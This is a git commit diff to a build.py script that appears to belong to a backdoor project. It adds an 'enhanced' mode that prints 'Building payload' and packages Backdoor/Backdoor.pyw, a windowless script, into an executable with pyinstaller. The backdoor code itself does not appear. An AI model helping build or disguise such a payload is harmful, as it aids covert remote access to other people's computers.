0fc21b751f166a695e90b2efdb332778c1ccdd0e
Phroggy <thatguyyoublocked@outlook.com>
2023-03-24 14:01:29 +0800

    sdadcsc

--- build.py
+++ build.py
@@ -1,9 +1,12 @@
 from subprocess import Popen
 from sys import argv
 from os import system
+from time import sleep
 
 system("color 0a")
 
 if argv[1] == "backdoor":
-    if argv[2] == 1:
-        Popen("pyinstaller --onefile --onedir Backdoor/backdoor.py")
+    if argv[2] == "enhanced":
+        print("[!] Building payload...")
+        sleep(5)
+        Popen("pyinstaller --onefile --onedir Backdoor/Backdoor.pyw")
